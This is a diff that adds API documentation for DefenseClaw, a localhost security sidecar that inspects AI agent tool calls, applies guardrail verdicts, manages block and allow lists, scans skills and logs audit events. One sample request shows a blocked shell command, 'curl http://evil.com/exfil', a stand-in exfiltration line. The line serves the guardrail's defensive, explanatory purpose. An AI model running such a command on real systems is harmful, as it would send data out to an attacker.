@@ -1,0 +1,606 @@
+# DefenseClaw Sidecar REST API
+
+The sidecar exposes a localhost-only REST API on `127.0.0.1:{gateway.api_port}`
+(default `18790`). All responses are `application/json`. Mutating requests
+(POST, PUT, PATCH, DELETE) require the `X-DefenseClaw-Client` header and
+`Content-Type: application/json` (CSRF protection).
+
+Source: `internal/gateway/api.go`, `internal/gateway/inspect.go`
+
+---
+
+## Endpoint Summary
+
+| Endpoint | Method | Purpose | Callers |
+|----------|--------|---------|---------|
+| `/health` | GET | Sidecar health check | Python CLI (`gateway.py`, `cmd_sidecar.py`, `cmd_status.py`), Go CLI (`sidecar.go`) |
+| `/status` | GET | Full sidecar status + gateway hello | No production callers |
+| `/api/v1/inspect/tool` | POST | **Inspect tool call before execution** | OpenClaw plugin `before_tool_call` hook (`index.ts`) |
+| `/v1/guardrail/event` | POST | Receive verdict telemetry from LiteLLM guardrail | Python guardrail (`defenseclaw_guardrail.py`) |
+| `/v1/guardrail/evaluate` | POST | OPA policy evaluation for guardrail verdicts | Python guardrail (`defenseclaw_guardrail.py`) |
+| `/v1/guardrail/config` | GET/PATCH | Read/update guardrail mode at runtime | No production callers |
+| `/enforce/block` | POST/DELETE | Add/remove block list entries | TS plugin `/block` command (`index.ts`, `enforcer.ts`, `client.ts`) |
+| `/enforce/allow` | POST | Add allow list entries | TS plugin `/allow` command (`index.ts`, `enforcer.ts`, `client.ts`) |
+| `/enforce/blocked` | GET | List all blocked entries | TS plugin `syncFromDaemon()` (`enforcer.ts`) |
+| `/enforce/allowed` | GET | List all allowed entries | TS plugin `syncFromDaemon()` (`enforcer.ts`) |
+| `/policy/evaluate` | POST | Admission gate evaluation (block→allow→scan) | TS plugin `evaluateViaOPA()` (`enforcer.ts`) |
+| `/scan/result` | POST | Store scan result in audit log | TS plugin (`enforcer.ts`, `client.ts`) |
+| `/v1/skill/scan` | POST | Run skill scanner on a local path | Python CLI (`gateway.py`, `cmd_skill.py`) |
+| `/v1/skill/fetch` | POST | Stream skill directory as tar.gz | No production callers |
+| `/skill/disable` | POST | Disable skill via OpenClaw WS | Python CLI (`cmd_skill.py`), sidecar watcher |
+| `/skill/enable` | POST | Enable skill via OpenClaw WS | Python CLI (`cmd_skill.py`) |
+| `/config/patch` | POST | Patch OpenClaw config via WS | No production callers |
+| `/skills` | GET | List skills from OpenClaw | Python CLI (`cmd_skill.py`) |
+| `/mcps` | GET | List MCP servers from config dirs | No production callers |
+| `/tools/catalog` | GET | Tool catalog from OpenClaw | No production callers |
+| `/alerts` | GET | Recent alerts from audit store | No production callers (TUI uses SQLite directly) |
+| `/audit/event` | POST | Log arbitrary audit event | TS plugin (`enforcer.ts`, `client.ts`) |
+
+---
+
+## Table of Contents
+
+- [Health & Status](#health--status)
+- [Tool Inspection](#tool-inspection)
+- [Guardrail (LiteLLM)](#guardrail-litellm)
+- [Enforcement (Block/Allow)](#enforcement-blockallow)
+- [Admission Policy](#admission-policy)
+- [Scanning](#scanning)
+- [Gateway Operations](#gateway-operations)
+- [Audit](#audit)
+
+---
+
+## Health & Status
+
+### GET /health
+
+Returns the subsystem health snapshot (gateway, watcher, API, guardrail
+states + uptime).
+
+**Callers:**
+- Python CLI: `OrchestratorClient.health()` in `cli/defenseclaw/gateway.py`
+- `defenseclaw sidecar status` command (`cli/defenseclaw/commands/cmd_sidecar.py`)
+- `defenseclaw status` command (`cli/defenseclaw/commands/cmd_status.py`) via `is_running()`
+- Go CLI: `internal/cli/sidecar.go` for sidecar health probe
+
+**Response:**
+
+```json
+{
+  "gateway":  { "state": "running", "since": "...", "error": "" },
+  "watcher":  { "state": "disabled", "since": "...", "error": "" },
+  "api":      { "state": "running", "since": "...", "error": "" },
+  "guardrail": { "state": "running", "since": "...", "error": "" },
+  "uptime_s": 3600
+}
+```
+
+### GET /status
+
+Returns the health snapshot plus the gateway hello payload (protocol
+version, features, auth) if connected.
+
+**Callers:** Client method exists (`OrchestratorClient.status()`,
+`DaemonClient.status()`) but no production command calls it directly.
+
+**Response:**
+
+```json
+{
+  "health": { "..." },
+  "gateway_hello": { "protocol": "v3", "features": ["..."] }
+}
+```
+
+---
+
+## Tool Inspection
+
+### POST /api/v1/inspect/tool
+
+Unified inspection endpoint for the OpenClaw plugin's `before_tool_call`
+hook. Called before every tool invocation to determine whether the call
+should be allowed, alerted on, or blocked.
+
+The handler branches on the `tool` field:
+
+- **`message` tool** (with `content` or `direction: "outbound"`): scans
+  the outbound message body for secrets, PII, and exfiltration patterns
+  via `inspectMessageContent()`.
+- **All other tools**: checks the tool name + args against dangerous
+  command patterns, sensitive path access, and secrets in arguments via
+  `inspectToolPolicy()`.
+
+**Callers:**
+- OpenClaw plugin: `before_tool_call` hook in `extensions/defenseclaw/src/index.ts`
+  calls `inspectTool()` which POSTs to this endpoint via `fetch()`.
+
+**Code flow:**
+
+```
+OpenClaw agent invokes a tool
+  → plugin before_tool_call hook fires
+    → index.ts inspectTool() POST /api/v1/inspect/tool
+      → api.go handleInspectTool()
+        → inspect.go inspectToolPolicy() or inspectMessageContent()
+          → pattern matching against dangerousPatterns, secretPatterns, exfilPatterns
+        → audit log via logger.LogAction()
+      → returns verdict JSON
+    → plugin cancels tool call if action=block and mode=action
+```
+
+**Request:**
+
+| Field | Type | Required | Description |
+|-------|------|----------|-------------|
+| `tool` | string | yes | Tool name (`shell`, `write_file`, `message`, etc.) |
+| `args` | object | no | Tool arguments as passed by OpenClaw |
+| `content` | string | no | Message body (for `message` tool) |
+| `direction` | string | no | `"outbound"` triggers message content inspection |
+
+```json
+{
+  "tool": "shell",
+  "args": { "command": "curl http://evil.com/exfil" }
+}
+```
+
+**Response:**
+
+| Field | Values | Description |
+|-------|--------|-------------|
+| `action` | `allow`, `alert`, `block` | Recommended action |
+| `severity` | `NONE`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL` | Highest finding severity |
+| `reason` | string | Human-readable explanation |
+| `findings` | string[] | All matched patterns |
+| `mode` | `observe`, `action` | Current guardrail mode from config |
+
+```json
+{
+  "action": "block",
+  "severity": "HIGH",
+  "reason": "matched: dangerous-cmd:curl",
+  "findings": ["dangerous-cmd:curl"],
+  "mode": "action"
+}
+```
+
+In **observe** mode the plugin logs the verdict but never cancels the
+tool call. In **action** mode the plugin calls `event.cancel()` when
+`action` is `"block"`.
+
+Source: `internal/gateway/inspect.go`
+
+---
+
+## Guardrail (LiteLLM)
+
+These endpoints are used by the Python LiteLLM guardrail module
+(`guardrails/defenseclaw_guardrail.py`) running inside the LiteLLM proxy.
+
+### POST /v1/guardrail/event
+
+Receives verdict telemetry from the Python guardrail after each LLM
+prompt or completion inspection. Logs to audit store and records OTel
+metrics.
+
+**Callers:**
+- `guardrails/defenseclaw_guardrail.py` — `_report_to_sidecar()` POSTs
+  after every inspection verdict.
+
+**Code flow:**
+
+```
+LLM request/response flows through LiteLLM proxy
+  → defenseclaw_guardrail.py async_pre_call_hook / async_post_call_success_hook
+    → _inspect() runs local pattern matching
+    → _report_to_sidecar() POST /v1/guardrail/event
+      → api.go handleGuardrailEvent()
+        → audit store: LogEvent() + LogAction()
+        → OTel: RecordGuardrailEvaluation() + RecordGuardrailLatency()
+```
+
+**Request:**
+
+| Field | Type | Required | Description |
+|-------|------|----------|-------------|
+| `direction` | string | yes | `"prompt"` or `"completion"` |
+| `model` | string | no | Model name (e.g. `claude-opus-4-5`) |
+| `action` | string | yes | `"allow"`, `"alert"`, or `"block"` |
+| `severity` | string | yes | `"NONE"`, `"MEDIUM"`, `"HIGH"`, etc. |
+| `reason` | string | no | Human-readable explanation |
+| `findings` | string[] | no | Matched pattern names |
+| `elapsed_ms` | number | no | Inspection duration |
+| `tokens_in` | number | no | Input token count |
+| `tokens_out` | number | no | Output token count |
+
+### POST /v1/guardrail/evaluate
+
+Evaluates guardrail scan results against the OPA policy engine (or
+built-in fallback). Returns the final action/severity decision.
+
+**Callers:**
+- `guardrails/defenseclaw_guardrail.py` — `_evaluate_via_sidecar()` POSTs
+  combined local + Cisco scan results for policy evaluation.
+
+**Code flow:**
+
+```
+defenseclaw_guardrail.py _inspect()
+  → _scan_local() and/or _scan_cisco() produce scan results
+  → _evaluate_via_sidecar() POST /v1/guardrail/evaluate
+    → api.go handleGuardrailEvaluate()
+      → policy.New(policyDir).EvaluateGuardrail() (OPA)
+      → fallback: built-in severity ranking if OPA unavailable
+      → audit store: LogEvent() + LogAction()
+      → OTel: RecordGuardrailEvaluation()
+    → returns GuardrailOutput JSON
+```
+
+**Request:**
+
+| Field | Type | Required | Description |
+|-------|------|----------|-------------|
+| `direction` | string | yes | `"prompt"` or `"completion"` |
+| `model` | string | no | Model name |
+| `mode` | string | yes | `"observe"` or `"action"` |
+| `scanner_mode` | string | no | `"local"`, `"remote"`, `"both"` |
+| `local_result` | object | no | `{ severity, action, findings }` |
+| `cisco_result` | object | no | `{ severity, action, findings }` |
+| `content_length` | number | no | Content length in chars |
+| `elapsed_ms` | number | no | Inspection duration |
+
+**Response:**
+
+```json
+{
+  "action": "alert",
+  "severity": "MEDIUM",
+  "reason": "built-in fallback (OPA unavailable)",
+  "scanner_sources": ["scanner"]
+}
+```
+
+### GET/PATCH /v1/guardrail/config
+
+Read or update guardrail runtime configuration (mode and scanner_mode).
+Changes are persisted to `~/.defenseclaw/guardrail_runtime.json` and
+take effect immediately without restarting the sidecar.
+
+**Callers:** No production callers currently. Available for runtime
+toggling between observe and action mode.
+
+**GET response:**
+
+```json
+{
+  "mode": "observe",
+  "scanner_mode": "local"
+}
+```
+
+**PATCH request:**
+
+```json
+{
+  "mode": "action",
+  "scanner_mode": "both"
+}
+```
+
+---
+
+## Enforcement (Block/Allow)
+
+### POST /enforce/block
+
+Add an entry to the block list. Returns `{"status": "blocked"}`.
+
+### DELETE /enforce/block
+
+Remove an entry from the block list. Returns `{"status": "unblocked"}`.
+
+**Callers:**
+- TS plugin: `DaemonClient.block()` / `unblock()` in `client.ts`
+- TS plugin: `PolicyEnforcer.block()` in `policy/enforcer.ts`
+- OpenClaw `/block` slash command in `index.ts`
+
+**Request:**
+
+| Field | Type | Required | Description |
+|-------|------|----------|-------------|
+| `target_type` | string | yes | `"skill"`, `"mcp"`, or `"plugin"` |
+| `target_name` | string | yes | Name of the target |
+| `reason` | string | no | Reason for blocking (default: `"blocked via REST API"`) |
+
+### POST /enforce/allow
+
+Add an entry to the allow list. Returns `{"status": "allowed"}`.
+
+**Callers:**
+- TS plugin: `DaemonClient.allow()` in `client.ts`
+- TS plugin: `PolicyEnforcer.allow()` in `policy/enforcer.ts`
+- OpenClaw `/allow` slash command in `index.ts`
+
+**Request:** Same schema as `/enforce/block`.
+
+### GET /enforce/blocked
+
+List all block list entries.
+
+**Callers:**
+- TS plugin: `DaemonClient.listBlocked()` — used by `PolicyEnforcer.syncFromDaemon()`
+
+**Response:**
+
+```json
+[
+  {
+    "id": "...",
+    "target_type": "skill",
+    "target_name": "malicious-skill",
+    "reason": "known malware",
+    "updated_at": "2026-03-24T12:00:00Z"
+  }
+]
+```
+
+### GET /enforce/allowed
+
+List all allow list entries. Same response shape as `/enforce/blocked`.
+
+**Callers:**
+- TS plugin: `DaemonClient.listAllowed()` — used by `PolicyEnforcer.syncFromDaemon()`
+
+---
+
+## Admission Policy
+
+### POST /policy/evaluate
+
+Evaluate an admission decision against the OPA policy engine (or
+built-in fallback). Implements the admission gate flow:
+block list → allow list → scan → verdict.
+
+**Callers:**
+- TS plugin: `DaemonClient.evaluatePolicy()` in `client.ts`
+- TS plugin: `PolicyEnforcer.evaluateViaOPA()` in `policy/enforcer.ts`
+
+**Code flow:**
+
+```
+PolicyEnforcer.evaluateSkill() / evaluateMCPServer() / evaluatePlugin()
+  → evaluateViaOPA() POST /policy/evaluate
+    → api.go handlePolicyEvaluate()
+      → policy.New(policyDir).Evaluate() (OPA)
+      → fallback: built-in block→allow→scan→severity gate
+    → returns AdmissionOutput JSON
+```
+
+**Request:**
+
+| Field | Type | Required | Description |
+|-------|------|----------|-------------|
+| `domain` | string | no | `"admission"` (default) |
+| `input.target_type` | string | yes | `"skill"`, `"mcp"`, or `"plugin"` |
+| `input.target_name` | string | yes | Name of the target |
+| `input.path` | string | no | Filesystem path |
+| `input.scan_result` | object | no | `{ max_severity, total_findings }` |
+
+**Response:**
+
+```json
+{
+  "ok": true,
+  "data": {
+    "verdict": "rejected",
+    "reason": "max severity HIGH triggers block"
+  }
+}
+```
+
+---
+
+## Scanning
+
+### POST /scan/result
+
+Store a scan result in the audit log. Used by the TS plugin after
+scanning skills/plugins/MCP configs.
+
+**Callers:**
+- TS plugin: `DaemonClient.submitScanResult()` in `client.ts`
+- TS plugin: `PolicyEnforcer` after admission scans in `policy/enforcer.ts`
+
+**Request:** A full `ScanResult` JSON object (scanner, target, timestamp,
+findings array).
+
+### POST /v1/skill/scan
+
+Run the Python `skill-scanner` CLI on a local directory path. Returns
+the scan result.
+
+**Callers:**
+- Python CLI: `OrchestratorClient.scan_skill()` in `cli/defenseclaw/gateway.py`
+- `defenseclaw scan` command with `--remote` flag in `cli/defenseclaw/commands/cmd_skill.py`
+
+**Code flow:**
+
+```
+defenseclaw scan /path/to/skill --remote
+  → cmd_skill.py POST /v1/skill/scan
+    → api.go handleSkillScan()
+      → scanner.NewSkillScanner().Scan() (shells out to Python skill-scanner)
+      → audit: LogAction() + LogScanWithVerdict()
+    → returns ScanResult JSON
+```
+
+**Request:**
+
+| Field | Type | Required | Description |
+|-------|------|----------|-------------|
+| `target` | string | yes | Absolute path to skill directory |
+| `name` | string | no | Skill name (for logging) |
+
+### POST /v1/skill/fetch
+
+Stream a skill directory as a `tar.gz` archive. Intended for remote
+scan workflows where the scanner runs on a different host.
+
+**Callers:** No production callers currently. Reserved for future
+remote deployment scenarios.
+
+**Request:**
+
+| Field | Type | Required | Description |
+|-------|------|----------|-------------|
+| `target` | string | yes | Absolute path to skill directory |
+
+**Response:** Binary `application/gzip` stream.
+
+---
+
+## Gateway Operations
+
+These endpoints proxy commands through the WebSocket connection to the
+OpenClaw gateway. They return `503 Service Unavailable` if the gateway
+is not connected, or `502 Bad Gateway` if the gateway rejects the RPC.
+
+### POST /skill/disable
+
+Disable a skill at the OpenClaw gateway.
+
+**Callers:**
+- Python CLI: `OrchestratorClient.disable_skill()` in `cli/defenseclaw/gateway.py`
+- `defenseclaw skill disable` command in `cli/defenseclaw/commands/cmd_skill.py`
+- Sidecar watcher: auto-disables skills that fail admission (`sidecar.go`)
+
+**Request:**
+
+```json
+{ "skillKey": "my-skill-name" }
+```
+
+### POST /skill/enable
+
+Enable a previously disabled skill at the OpenClaw gateway.
+
+**Callers:**
+- Python CLI: `OrchestratorClient.enable_skill()` in `cli/defenseclaw/gateway.py`
+- `defenseclaw skill enable` command in `cli/defenseclaw/commands/cmd_skill.py`
+
+**Request:**
+
+```json
+{ "skillKey": "my-skill-name" }
+```
+
+### POST /config/patch
+
+Patch an OpenClaw gateway config value via the WebSocket RPC.
+
+**Callers:** Client method exists (`OrchestratorClient.patch_config()`)
+but no production command calls it directly.
+
+**Request:**
+
+```json
+{ "path": "agent.model", "value": "litellm/claude-opus-4-5" }
+```
+
+### GET /skills
+
+List skills from the OpenClaw gateway via WebSocket RPC.
+
+**Callers:**
+- Python CLI: `OrchestratorClient.list_skills()` in `cli/defenseclaw/gateway.py`
+- `defenseclaw skill list` command in `cli/defenseclaw/commands/cmd_skill.py`
+
+### GET /mcps
+
+List MCP server names discovered from the configured MCP directories.
+Does not query the gateway — reads the filesystem directly.
+
+**Callers:** Client method exists (`DaemonClient.listMCPs()`) but no
+production code calls it.
+
+### GET /tools/catalog
+
+Fetch the runtime tool catalog with provenance from the OpenClaw
+gateway via WebSocket RPC.
+
+**Callers:** Client method exists (`OrchestratorClient.get_tools_catalog()`)
+but no production command calls it directly.
+
+---
+
+## Audit
+
+### POST /audit/event
+
+Log an arbitrary audit event to the SQLite store.
+
+**Callers:**
+- TS plugin: `DaemonClient.logEvent()` in `client.ts`
+- TS plugin: `PolicyEnforcer.reportToDaemon()` posts admission outcomes
+  in `policy/enforcer.ts`
+
+**Request:**
+
+| Field | Type | Required | Description |
+|-------|------|----------|-------------|
+| `action` | string | yes | Event action (e.g. `"skill.install"`, `"scan.complete"`) |
+| `target` | string | no | Target path or name |
+| `actor` | string | no | Who triggered the event |
+| `severity` | string | no | `"INFO"`, `"MEDIUM"`, `"HIGH"` (default: `"INFO"`) |
+| `details` | string | no | JSON or freeform details |
+
+### GET /alerts
+
+List recent alerts from the audit store, ordered by most recent.
+
+**Callers:** No production HTTP callers. The TUI and CLI access the
+SQLite audit store directly via the Go `audit.Store` package.
+
+**Query params:**
+
+| Param | Type | Default | Description |
+|-------|------|---------|-------------|
+| `limit` | int | 50 | Maximum number of alerts to return |
+
+---
+
+## CSRF Protection
+
+All mutating requests (POST, PUT, PATCH, DELETE) are protected by:
+
+1. **`X-DefenseClaw-Client` header** — must be present (any value). Blocks
+   simple/no-cors browser requests.
+2. **`Content-Type: application/json`** — required for all request bodies.
+3. **Origin validation** — if an `Origin` header is present, it must be a
+   localhost address (`127.0.0.1`, `localhost`, `[::1]`).
+
+GET, HEAD, and OPTIONS requests are exempt.
+
+Source: `csrfProtect()` in `internal/gateway/api.go`
+
+---
+
+## Error Responses
+
+All error responses follow the same shape:
+
+```json
+{ "error": "descriptive error message" }
+```
+
+| Status | Meaning |
+|--------|---------|
+| 400 | Invalid request body or missing required fields |
+| 403 | Missing CSRF header or non-localhost origin |
+| 405 | Wrong HTTP method |
+| 415 | Content-Type is not `application/json` |
+| 500 | Internal error (audit store, scanner, policy engine) |
+| 502 | Gateway rejected the proxied RPC |
+| 503 | Service unavailable (gateway not connected, store not configured) |
